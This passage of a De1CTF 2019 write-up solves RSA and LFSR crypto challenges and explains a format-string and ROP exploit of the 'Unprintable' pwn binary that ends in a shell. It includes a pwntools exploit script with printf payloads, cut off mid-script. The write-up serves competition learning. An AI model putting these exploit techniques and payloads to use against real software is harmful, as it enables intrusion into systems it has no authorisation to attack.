class="number">16</span>)</span><br><span class="line">q1=q1p</span><br><span class="line">q2 =  <span class="number">114401188227479584680884046151299704656920536168767132916589182357583461053336386996123783294932566567773695426689447410311969456458574731187512974868297092638677515283584994416382872450167046416573472658841627690987228528798356894803559278308702635288537653192098514966089168123710854679638671424978221959513</span></span><br><span class="line">c1 =  <span class="number">262739975753930281690942784321252339035906196846340713237510382364557685379543498765074448825799342194332681181129770046075018122033421983227887719610112028230603166527303021036386350781414447347150383783816869784006598225583375458609586450854602862569022571672049158809874763812834044257419199631217527367046624888837755311215081173386523806086783266198390289097231168172692326653657393522561741947951887577156666663584249108899327053951891486355179939770150550995812478327735917006194574412518819299303783243886962455399783601229227718787081785391010424030509937403600351414176138124705168002288620664809270046124</span></span><br><span class="line">c2 =  <span class="number">7395591129228876649030819616685821899204832684995757724924450812977470787822266387122334722132760470911599176362617225218345404468270014548817267727669872896838106451520392806497466576907063295603746660003188440170919490157250829308173310715318925771643105064882620746171266499859049038016902162599261409050907140823352990750298239508355767238575709803167676810456559665476121149766947851911064706646506705397091626648713684511780456955453552020460909638016134124590438425738826828694773960514221910109473941451471431637903182205738738109429736425025621308300895473186381826756650667842656050416299166317372707709596</span></span><br><span class="line"><span class="keyword">assert</span>(c1==pow(flag,e1,p*q1))</span><br><span class="line"><span class="keyword">assert</span>(c2==pow(flag,e2,p*q2))</span><br></pre></td></tr></table></figure>
<h4 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf8</span></span><br><span class="line"><span class="keyword">import</span> binascii,gmpy2</span><br><span class="line"><span class="comment"># from data import e1,e2,p,q1p,q1q,hint,flag,q2</span></span><br><span class="line"></span><br><span class="line">n =  [<span class="number">20129615352491765499340112943188317180548761597861300847305827141510465619670536844634558246439230371658836928103063432870245707180355907194284861510906071265352409579441048101084995923962148527097370705452070577098780246282820065573711015664291991372085157016901209114191068574208680397710042842835940428451949500607613634682684113208766694028789275748528254287705759528498986306494267817198340658241873024800336013946294891687591013414935237821291805123285905335762719823771647853378892868896078424572232934360940672962436849523915563328779942134504499568866135266628078485232098208237036724121481835035731201383423L</span>, <span class="number">31221650155627849964466413749414700613823841060149524451234901677160009099014018926581094879840097248543411980533066831976617023676225625067854003317018794041723612556008471579060428898117790587991055681380408263382761841625714415879087478072771968160384909919958010983669368360788505288855946124159513118847747998656422521414980295212646675850690937883764000571667574381419144372824211798018586804674824564606122592483286575800685232128273820087791811663878057827386379787882962763290066072231248814920468264741654086011072638211075445447843691049847262485759393290853117072868406861840793895816215956869523289231421L</span>, <span class="number">29944537515397953361520922774124192605524711306753835303703478890414163510777460559798334313021216389356251874917792007638299225821018849648520673813786772452822809546571129816310207232883239771324122884804993418958309460009406342872173189008449237959577469114158991202433476710581356243815713762802478454390273808377430685157110095496727966308001254107517967559384019734279861840997239176254236069001453544559786063915970071130087811123912044312219535513880663913831358790376650439083660611831156205113873793106880255882114422025746986403355066996567909581710647746463994280444700922867397754748628425967488232530303L</span>, <span class="number">25703437855600135215185778453583925446912731661604054184163883272265503323016295700357253105301146726667897497435532579974951478354570415554221401778536104737296154316056314039449116386494323668483749833147800557403368489542273169489080222009368903993658498263905567516798684211462607069796613434661148186901892016282065916190920443378756167250809872483501712225782004396969996983057423942607174314132598421269169722518224478248836881076484639837343079324636997145199835034833367743079935361276149990997875905313642775214486046381368619638551892292787783137622261433528915269333426768947358552919740901860982679180791L</span>]</span><br><span class="line">c =  [<span class="number">19131432661217908470262338421299691998526157790583544156741981238822158563988520225986915234570037383888112724408392918113942721994125505014727545946133307329781747600302829588248042922635714391033431930411180545085316438084317927348705241927570432757892985091396044950085462429575440060652967253845041398399648442340042970814415571904057667028157512971079384601724816308078631844480110201787343583073815186771790477712040051157180318804422120472007636722063989315320863580631330647116993819777750684150950416298085261478841177681677867236865666207391847046483954029213495373613490690687473081930148461830425717614569L</span>, <span class="number">15341898433226638235160072029875733826956799982958107910250055958334922460202554924743144122170018355117452459472017133614642242411479849369061482860570279863692425621526056862808425135267608544855833358314071200687340442512856575278712986641573012456729402660597339609443771145347181268285050728925993518704899005416187250003304581230701444705157412790787027926810710998646191467130550713600765898234392350153965811595060656753711278308005193370936296124790772689433773414703645703910742193898471800081321469055211709339846392500706523670145259024267858368216902176489814789679472227343363035428541915118378163012031L</span>, <span class="number">18715065071648040017967211297231106538139985087685358555650567057715550586464814763683688299037897182845007578571401359061213777645114414642903077003568155508465819628553747173244235936586812445440095450755154357646737087071605811984163416590278352605433362327949048243722556262979909488202442530307505819371594747936223835233586945423522256938701002370646382097846105014981763307729234675737702252155130837154876831885888669150418885088089324534892506199724486783446267336789872782137895552509353583305880144947714110009893134162185382309992604435664777436197587312317224862723813510974493087450281755452428746194446L</span>, <span class="number">2282284561224858293138480447463319262474918847630148770112472703128549032592187797289965592615199709857879008271766433462032328498580340968871260189669707518557157836592424973257334362931639831072584824103123486522582531666152363874396482744561758133655406410364442174983227005501860927820871260711861008830120617056883514525798709601744088135999465598338635794275123149165498933580159945032363880613524921913023341209439657145962332213468573402863796920571812418200814817086234262280338221161622789516829363805084715652121739036183264026120868756523770196284142271849879003202190966150390061195469351716819539183797L</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">CRT</span><span class="params">(mi, ai)</span>:</span></span><br><span class="line">    <span class="keyword">assert</span>(reduce(gmpy2.gcd,mi)==<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">assert</span> (isinstance(mi, list) <span class="keyword">and</span> isinstance(ai, list))</span><br><span class="line">    M = reduce(<span class="keyword">lambda</span> x, y: x * y, mi)</span><br><span class="line">    ai_ti_Mi = [a * (M / m) * gmpy2.invert(M / m, m) <span class="keyword">for</span> (m, a) <span class="keyword">in</span> zip(mi, ai)]</span><br><span class="line">    <span class="keyword">return</span> reduce(<span class="keyword">lambda</span> x, y: x + y, ai_ti_Mi) % M</span><br><span class="line"></span><br><span class="line">p=gmpy2.iroot(CRT(n, c), <span class="number">4</span>)[<span class="number">0</span>]</span><br><span class="line"><span class="keyword">print</span> <span class="string">"p = "</span>,p</span><br><span class="line"><span class="comment"># ====================got p</span></span><br><span class="line">ee1 = <span class="number">42</span></span><br><span class="line">ee2 = <span class="number">3</span></span><br><span class="line">ce1 =  <span class="number">45722651786340123946960815003059322528810481841378247280642868553607692149509126962872583037142461398806689489141741494974836882341505234255325683219092163052843461632338442529011502378931140356111756932712822516814023166068902569458299933391973504078898958921809723346229893913662577294963528318424676803942288386430172430880307619748186863890050113934573820505570928109017842647598266634344447182347849367714564686341871007505886728393751147033556889217604647355628557502208364412269944908011305064122941446516990168924709684092200183860653173856272384</span></span><br><span class="line">ce2 =  <span class="number">13908468332333567158469136439932325992349696889129103935400760239319454409539725389747059213835238373047899198211128689374049729578146875309231962936554403287882999967840346216695208424582739777034261079550395918048421086843927009452479936045850799096750074359160775182238980989229190157551197830879877097703347301072427149474991803868325769967332356950863518504965486565464059770451458557744949735282131727956056279292800694203866167270268988437389945703117070604488999247750139568614939965885211276821987586882908159585863514561191905040244967655444219603287214405014887994238259270716355378069726760953320025828158</span></span><br><span class="line">tmp =  <span class="number">864078778078609835167779565982540757684070450697854309005171742813414963447462554999012718960925081621571487444725528982424037419052194840720949809891134854871222612682162490991065015935449289960707882463387</span></span><br><span class="line">n  =  <span class="number">15911581555796798614711625288508309704791837516232122410440958830726078821069050404012820896260071751380436992710638364294658173571101596931605797509712839622479368850251206419748090059752427303611760004621378226431226983665746837779056271530181865648115862947527212787824629516204832313026456390047768174765687040950636530480549014401279054346098030395100387004111574278813749630986724706263655166289586230453975953773791945408589484679371854113457758157492241225180907090235116325034822993748409011554673180494306003272836905082473475046277554085737627846557240367696214081276345071055578169299060706794192776825039</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">200000</span>):</span><br><span class="line">	<span class="keyword">if</span> gmpy2.iroot(ce1+n*i,<span class="number">42</span>)[<span class="number">1</span>]==<span class="number">1</span>:</span><br><span class="line">		res=gmpy2.iroot(ce1+n*i,<span class="number">42</span>)[<span class="number">0</span>]</span><br><span class="line">		e1=res</span><br><span class="line">		<span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">200000</span>):</span><br><span class="line">	<span class="keyword">if</span> gmpy2.iroot(ce2+n*i,<span class="number">3</span>)[<span class="number">1</span>]==<span class="number">1</span>:</span><br><span class="line">		res=gmpy2.iroot(ce2+n*i,<span class="number">3</span>)[<span class="number">0</span>]</span><br><span class="line">		e2=res-tmp</span><br><span class="line">		<span class="keyword">break</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"e1 = "</span>,e1</span><br><span class="line"><span class="keyword">print</span> <span class="string">"e2 = "</span>,e2</span><br><span class="line"><span class="comment"># ====================got e1,e2</span></span><br><span class="line">e = <span class="number">46531</span></span><br><span class="line">n = <span class="number">16278524034278364842964386062476113517067911891699789991355982121084973951738324063305190630865511554888330215827724887964565979607808294168282995825864982603759381323048907814961279012375346497781046417204954101076457350988751188332353062731641153547102721113593787978587135707313755661153376485647168543680503160420091693269984008764444291289486805840439906620313162344057956594836197521501755378387944609246120662335790110901623740990451586621846212047950084207251595169141015645449217847180683357626383565631317253913942886396494396189837432429078251573229378917400841832190737518763297323901586866664595327850603</span></span><br><span class="line">c = <span class="number">14992132140996160330967307558503117255626925777426611978518339050671013041490724616892634911030918360867974894371539160853827180596100892180735770688723270765387697604426715670445270819626709364566478781273676115921657967761494619448095207169386364541164659123273236874649888236433399127407801843412677293516986398190165291102109310458304626261648346825196743539220198199366711858135271877662410355585767124059539217274691606825103355310348607611233052725805236763220343249873849646219850954945346791015858261715967952461021650307307454434510851869862964236227932964442289459508441345652423088404453536608812799355469</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># yafu got q1p,q1q</span></span><br><span class="line">q1p = <span class="number">127587319253436643569312142058559706815497211661083866592534217079310497260365307426095661281103710042392775453866174657404985539066741684196020137840472950102380232067786400322600902938984916355631714439668326671310160916766472897536055371474076089779472372913037040153356437528808922911484049460342088835693</span></span><br><span class="line">q1q = <span class="number">127587319253436643569312142058559706815497211661083866592534217079310497260365307426095661281103710042392775453866174657404985539066741684196020137840472950102380232067786400322600902938984916355631714439668326671310160916766472897536055371474076089779472372913037040153356437528808922911484049460342088834871</span></span><br><span class="line"><span class="keyword">if</span> q1p&gt;q1q:</span><br><span class="line">	q1p,q1q=q1q,q1p</span><br><span class="line"></span><br><span class="line"><span class="comment"># below is not necessary</span></span><br><span class="line">phi=(q1p<span class="number">-1</span>)*(q1q<span class="number">-1</span>)</span><br><span class="line"><span class="keyword">assert</span>(gmpy2.gcd(e,phi)==<span class="number">1</span>)</span><br><span class="line">d=gmpy2.invert(e,phi)</span><br><span class="line">hint=pow(c,d,n)</span><br><span class="line">hint=binascii.unhexlify(hex(hint)[<span class="number">2</span>:])</span><br><span class="line"><span class="keyword">print</span> <span class="string">"hint = "</span>,hint</span><br><span class="line"><span class="comment"># ====================got  q1p as q1</span></span><br><span class="line"><span class="comment"># flag=int(binascii.hexlify(flag),16)</span></span><br><span class="line">q1=q1p</span><br><span class="line"><span class="keyword">print</span> <span class="string">"q1 = "</span>,q1</span><br><span class="line">q2 =  <span class="number">114401188227479584680884046151299704656920536168767132916589182357583461053336386996123783294932566567773695426689447410311969456458574731187512974868297092638677515283584994416382872450167046416573472658841627690987228528798356894803559278308702635288537653192098514966089168123710854679638671424978221959513</span></span><br><span class="line">c1 =  <span class="number">262739975753930281690942784321252339035906196846340713237510382364557685379543498765074448825799342194332681181129770046075018122033421983227887719610112028230603166527303021036386350781414447347150383783816869784006598225583375458609586450854602862569022571672049158809874763812834044257419199631217527367046624888837755311215081173386523806086783266198390289097231168172692326653657393522561741947951887577156666663584249108899327053951891486355179939770150550995812478327735917006194574412518819299303783243886962455399783601229227718787081785391010424030509937403600351414176138124705168002288620664809270046124</span></span><br><span class="line">c2 =  <span class="number">7395591129228876649030819616685821899204832684995757724924450812977470787822266387122334722132760470911599176362617225218345404468270014548817267727669872896838106451520392806497466576907063295603746660003188440170919490157250829308173310715318925771643105064882620746171266499859049038016902162599261409050907140823352990750298239508355767238575709803167676810456559665476121149766947851911064706646506705397091626648713684511780456955453552020460909638016134124590438425738826828694773960514221910109473941451471431637903182205738738109429736425025621308300895473186381826756650667842656050416299166317372707709596</span></span><br><span class="line"><span class="keyword">assert</span>(<span class="number">14</span>==gmpy2.gcd(e1,(p<span class="number">-1</span>)*(q1<span class="number">-1</span>)))</span><br><span class="line"><span class="keyword">assert</span>(<span class="number">14</span>== gmpy2.gcd(e2,(p<span class="number">-1</span>)*(q2<span class="number">-1</span>)))</span><br><span class="line">e1=e1//<span class="number">14</span>;e2=e2//<span class="number">14</span></span><br><span class="line">n1=p*q1;n2=p*q2</span><br><span class="line">phi1=(p<span class="number">-1</span>)*(q1<span class="number">-1</span>);phi2=(p<span class="number">-1</span>)*(q2<span class="number">-1</span>)</span><br><span class="line">d1=gmpy2.invert(e1,phi1);d2=gmpy2.invert(e2,phi2)</span><br><span class="line">f1=pow(c1,d1,n1);f2=pow(c2,d2,n2)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">GCRT</span><span class="params">(mi, ai)</span>:</span></span><br><span class="line">    <span class="comment"># mi,ai分别表示模数和取模后的值,都为列表结构</span></span><br><span class="line">    <span class="keyword">assert</span> (isinstance(mi, list) <span class="keyword">and</span> isinstance(ai, list))</span><br><span class="line">    curm, cura = mi[<span class="number">0</span>], ai[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">for</span> (m, a) <span class="keyword">in</span> zip(mi[<span class="number">1</span>:], ai[<span class="number">1</span>:]):</span><br><span class="line">        d = gmpy2.gcd(curm, m)</span><br><span class="line">        c = a - cura</span><br><span class="line">        <span class="keyword">assert</span> (c % d == <span class="number">0</span>) <span class="comment">#不成立则不存在解</span></span><br><span class="line">        K = c // d * gmpy2.invert(curm // d, m // d)</span><br><span class="line">        cura += curm * K</span><br><span class="line">        curm = curm * m // d</span><br><span class="line">        cura %= curm</span><br><span class="line">    <span class="keyword">return</span> (cura % curm, curm) <span class="comment">#(解,最小公倍数)</span></span><br><span class="line"></span><br><span class="line">f3,lcm = GCRT([n1,n2],[f1,f2])</span><br><span class="line"><span class="keyword">assert</span>(f3%n1==f1);<span class="keyword">assert</span>(f3%n2==f2);<span class="keyword">assert</span>(lcm==q1*q2*p)</span><br><span class="line">n3=q1*q2</span><br><span class="line">c3=f3%n3</span><br><span class="line">phi3=(q1<span class="number">-1</span>)*(q2<span class="number">-1</span>)</span><br><span class="line"><span class="keyword">assert</span>(gmpy2.gcd(<span class="number">7</span>,phi3)==<span class="number">1</span>)</span><br><span class="line">d3=gmpy2.invert(<span class="number">7</span>,phi3)</span><br><span class="line">m3=pow(c3,d3,n3)</span><br><span class="line"><span class="keyword">if</span> gmpy2.iroot(m3,<span class="number">2</span>)[<span class="number">1</span>] == <span class="number">1</span>:</span><br><span class="line">    flag=gmpy2.iroot(m3,<span class="number">2</span>)[<span class="number">0</span>]</span><br><span class="line">    print(binascii.unhexlify(hex(flag)[<span class="number">2</span>:]))</span><br><span class="line"></span><br><span class="line"><span class="comment"># p =  109935857933867829728985398563235455481120300859311421762540858762721955038310117609456763338082237907005937380873151279351831600225270995344096532750271070807051984097524900957809427861441436796934012393707770012556604479065826879107677002380580866325868240270494148512743861326447181476633546419262340100453</span></span><br><span class="line"><span class="comment"># e1 =  15218928658178</span></span><br><span class="line"><span class="comment"># e2 =  381791429275130</span></span><br><span class="line"><span class="comment"># hint =  "orz...you.found.me.but.sorry.no.hint...keep.on.and.enjoy.it!"</span></span><br><span class="line"><span class="comment"># q1 =  127587319253436643569312142058559706815497211661083866592534217079310497260365307426095661281103710042392775453866174657404985539066741684196020137840472950102380232067786400322600902938984916355631714439668326671310160916766472897536055371474076089779472372913037040153356437528808922911484049460342088834871</span></span><br><span class="line"><span class="comment"># de1ctf&#123;9b10a98b-71bb-4bdf-a6ff-f319943de21f&#125;</span></span><br><span class="line"><span class="comment"># [Finished in 0.7s]</span></span><br></pre></td></tr></table></figure>
<h2 id="Babylfsr"><a href="#Babylfsr" class="headerlink" title="Babylfsr"></a>Babylfsr</h2><p>你可以在<a href="https://ctf-wiki.github.io/ctf-wiki/crypto/streamcipher/fsr/lfsr/" target="_blank" rel="noopener">CTF-WIKI</a>的这个部分找到有关lfsr的基本知识。并且在<code>BM algorithm</code>下面提到可以用2n的序列恢复mask和key的方法。在这个挑战中我们知道的序列的长度只有(2n-8bits)，但是我们可以通过约束条件<code>FLAG[7:11]==&#39;1224&#39;</code>去爆破剩下的8bits。然后恢复mask，恢复key，最终得到明文</p>
<h4 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h4><ol>
<li><p>Code/exp.sage(解题脚本,当然你也可以使用B-M算法恢复mask)</p>
</li>
<li><p>Code/task.py(使用KEY和MASK生成序列的脚本)</p>
</li>
<li><p>Code/output(task.py的输出)</p>
</li>
<li><p>Code/secret.py(包含MASK,KEY和FLAG)</p>
<h2 id="Obscured"><a href="#Obscured" class="headerlink" title="Obscured"></a>Obscured</h2><p>Github不太支持数学公式渲染。你可以在本地渲染并查看WP。<br><img src="https://github.com/De1ta-team/De1CTF2019/raw/master/writeup/crypto/Obscured/pic/sol_zh.jpg" alt="avatar"><br><img src="https://github.com/De1ta-team/De1CTF2019/raw/master/writeup/crypto/Obscured/pic/code_zh.jpg" alt="avatar"></p>
</li>
</ol>
<h2 id="Mini-Purε"><a href="#Mini-Purε" class="headerlink" title="Mini Purε"></a>Mini Purε</h2><p>Github不太支持数学公式渲染。你可以在本地渲染并查看WP。<br><img src="https://github.com/De1ta-team/De1CTF2019/raw/master/writeup/crypto/Mini%20Purε/pic/sol_zh.jpg" alt="avatar"><br><img src="https://github.com/De1ta-team/De1CTF2019/raw/master/writeup/crypto/Mini%20Purε/pic/code_zh.jpg" alt="avatar"></p>
<h1 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h1><h2 id="Unprintable"><a href="#Unprintable" class="headerlink" title="Unprintable"></a>Unprintable</h2><p>这题其实是pwnable tw上printable一道题的变种</p>
<p>理论上可以不用打印栈地址出来，只要预测栈后三位就可以了</p>
<p>首先是劫持控制流，栈上面残留了一个ld.so的地址</p>
<p>在exit的时候会执行dl_fini函数，里面有一段比较有趣的片段</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;_dl_fini+819&gt;:	call   QWORD PTR [r12+rdx*8]</span><br></pre></td></tr></table></figure>
<p>rdx固定为0，r12来自下面的代码片段</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;_dl_fini+777&gt;:	mov    r12,QWORD PTR [rax+0x8]</span><br><span class="line">&lt;_dl_fini+781&gt;:	mov    rax,QWORD PTR [rbx+0x120]</span><br><span class="line">&lt;_dl_fini+788&gt;:	add    r12,QWORD PTR [rbx]</span><br></pre></td></tr></table></figure>
<p>rbx指向的刚好就是栈上残留的ld.so的地址，因此我们可以控制[rbx]的值</p>
<p>r12默认指向的是fini_array，通过控制rbx，我们可以让r12指向bss，也就是我们可以劫持控制流了</p>
<p>但是劫持控制流之后呢？</p>
<p>我们可以再跳回main函数</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">.text:00000000004007A3                 mov     edx, 1000h      ; nbytes</span><br><span class="line">.text:00000000004007A8                 mov     esi, offset buf ; buf</span><br><span class="line">.text:00000000004007AD                 mov     edi, 0          ; fd</span><br><span class="line">.text:00000000004007B2                 call    read</span><br></pre></td></tr></table></figure>
<p>再次读内容到bss段，再printf出来</p>
<p>如果比较细心的话，可以发现这个时候栈上第23个参数刚好指向的是printf的返回地址，也就是我们可以在printf之后再跳回0x4007A3，也就是能无限循环printf</p>
<p>有了无限循环printf，那么就和平常的有循环的printf一样做了</p>
<p>这个时候我们就有了任意写，可以写栈上printf返回地址后面的内容，写一个bss段的地址，再配合 pop rsp这个gadget就可以进行rop了</p>
<p>这里还有一个小坑，就是printf超过0x2000个字节之后用 %hn 写不了值，所以要爆破到适合的栈地址，不过概率也挺高的</p>
<p>有了rop之后呢？我们还是leak不了，这个时候可以借助一个神奇的gadget</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.text:00000000004006E8                 adc     [rbp+48h], edx</span><br></pre></td></tr></table></figure>
<p>rbp和edx我们都是可以控制的，刚好bss段中有stdin,stdout,sterr这几个值，指向的是libc</p>
<p>所以我们可以利用这个gadget将stderr改成one_gadget，再利用__libc_csu_init中的<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">call    qword ptr [r12+rbx*8]</span><br></pre></td></tr></table></figure></p>
<p>就可以get shell了</p>
<p>get shell之后就挺简单了，利用重定向拿flag</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat flag &gt;&amp;0</span><br></pre></td></tr></table></figure>
<h4 id="exp-3"><a href="#exp-3" class="headerlink" title="exp"></a>exp</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">debug=1</span><br><span class="line"></span><br><span class="line">context.log_level=&apos;debug&apos;</span><br><span class="line"></span><br><span class="line">if debug:</span><br><span class="line">    p=process(&apos;./unprintable&apos;)</span><br><span class="line">    #p=process(&apos;&apos;,env=&#123;&apos;LD_PRELOAD&apos;:&apos;./libc.so&apos;&#125;)</span><br><span class="line">else:</span><br><span class="line">    p=remote(&apos;&apos;,)</span><br><span class="line"></span><br><span class="line">def ru(x):</span><br><span class="line">    return p.recvuntil(x)</span><br><span class="line"></span><br><span class="line">def se(x):</span><br><span class="line">    p.send(x)</span><br><span class="line"></span><br><span class="line">def sl(x):</span><br><span class="line">    p.sendline(x)</span><br><span class="line"></span><br><span class="line">def wait(x=True):</span><br><span class="line">    #raw_input()</span><br><span class="line">    sleep(0.3)</span><br><span class="line"></span><br><span class="line">def write_addr(addr,sz=6):</span><br><span class="line">    t = (stack+0x40)%0x100</span><br><span class="line">    v = p64(addr)</span><br><span class="line">    for i in range(sz):</span><br><span class="line">        if t+i != 0:</span><br><span class="line">            se(&apos;%&apos;+str(t+i)+&apos;c%18$hhn%&apos;+str(1955-t-i)+&apos;c%23$hn\x00&apos;)</span><br><span class="line">        else:</span><br><span class="line">            se(&apos;%18$hhn%1955c%23$hn&apos;)</span><br><span class="line">        wait()</span><br><span class="line">        tv = ord(v[i])</span><br><span class="line">        if tv != 0:</span><br><span class="line">            se(&apos;%&apos;+str(tv)+&apos;c%13$hhn%&apos;+str(1955-tv)+&apos;c%23$hn\x00&apos;)</span><br><span class="line">        else:</span><br><span class="line">            se(&apos;%13$hhn%1955c%23$hn&apos;)</span><br><span class="line">        wait()</span><br><span class="line"></span><br><span class="line">def write_value(addr,value,addr_sz=6):</span><br><span class="line">    write_addr(addr,addr_sz)</span><br><span class="line">    se(&apos;%&apos;+str(ord(value[0]))+&apos;c%14$hhn%&apos;+str(1955-ord(value[0]))+&apos;c%23$hn\x00&apos;)</span><br><span class="line">    wait()</span><br><span class="line">    ta = p64(addr)[1]</span><br><span class="line">    for i in range(1,len(value)):</span><br><span class="line">        tmp = p64(addr+i)[1]</span><br><span class="line">        if ta!=tmp:</span><br><span class="line">            write_addr(addr+i,2)</span><br><span class="line">            ta = tmp</span><br><span class="line">        else:</span><br><span class="line">            write_addr(addr+i,1)</span><br><span class="line">        if ord(value[i]) !=0:</span><br><span class="line">            se(&apos;%&apos;+str(ord(value[i]))+&apos;c%14$hhn%&apos;+str(1955-ord(value[i]))+&apos;c%23$hn\x00&apos;)</span><br><span class="line">        else:</span><br><span class="line">            se(&apos;%14$hhn%1955c%23$hn\x00&apos;)</span><br><span class="line">        wait()</span><br><span class="line"></span><br><span class="line">buf = 0x601060+0x100+4</span><br><span class="line"></span><br><span class="line">ru(&apos;This is your gift: &apos;)</span><br><span class="line">stack = int(ru(&apos;\n&apos;),16)-0x118</span><br><span class="line"></span><br><span class="line">if stack%0x10000 &gt; 0x2000:</span><br><span class="line">    p.close()</span><br><span class="line">    exit()</span><br><span class="line"></span><br><span class="line">ret_addr = stack - 0xe8</span><br><span class="line"></span><br><span class="line">se(&apos;%&apos;+str(buf-0x600DD8)+&apos;c%26$hn&apos;.ljust(0x100,&apos;\x00&apos;)+p64(0x4007A3))</span><br><span class="line">wait()</span><br><span class="line"></span><br><span class="line">tmp = (stack+0x40)%0x10000</span><br><span 